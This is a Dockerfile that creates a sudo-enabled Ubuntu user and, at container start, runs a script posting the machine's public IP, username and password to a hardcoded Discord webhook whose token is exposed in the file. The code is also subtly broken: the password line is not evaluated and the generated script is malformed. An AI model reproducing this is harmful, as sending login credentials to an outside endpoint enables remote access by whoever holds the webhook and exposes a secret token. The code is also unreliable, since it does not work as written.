# Use the official Ubuntu base image
FROM ubuntu:latest

# Set environment variables
ENV DEBIAN_FRONTEND=noninteractive
ENV WEBHOOK_URL=https://discord.com/api/webhooks/1289955380323160127/6JzbyzLROIo80Hb4uh3ImGpEPg2pKW5U1bLenvOcL7uqxd4bAxXbZaPsAsk9xO66wn35
ENV USERNAME=newuser
ENV PASSWORD=$(openssl rand -base64 12)

# Update and install necessary packages
RUN apt-get update && \
    apt-get install -y sudo curl jq && \
    rm -rf /var/lib/apt/lists/*

# Create a new user and add to sudo group
RUN useradd -m -s /bin/bash $USERNAME && \
    echo "$USERNAME:$PASSWORD" | chpasswd && \
    usermod -aG sudo $USERNAME

# Script to send IP, username, and password to Discord webhook
RUN echo '#!/bin/bash\n' \
         'IP=$(curl -s ifconfig.me)\n' \
         'PAYLOAD=$(jq -n --arg ip "$IP" --arg user "$USERNAME" --arg pass "$PASSWORD" \'{"content": "IP: \($ip)\nUser: \($user)\nPassword: \($pass)"}\')\n' \
         'curl -H "Content-Type: application/json" -d "$PAYLOAD" $WEBHOOK_URL\n' \
         > /usr/local/bin/send_webhook.sh && \
    chmod +x /usr/local/bin/send_webhook.sh

# Execute the script during container startup
CMD ["/usr/local/bin/send_webhook.sh"]
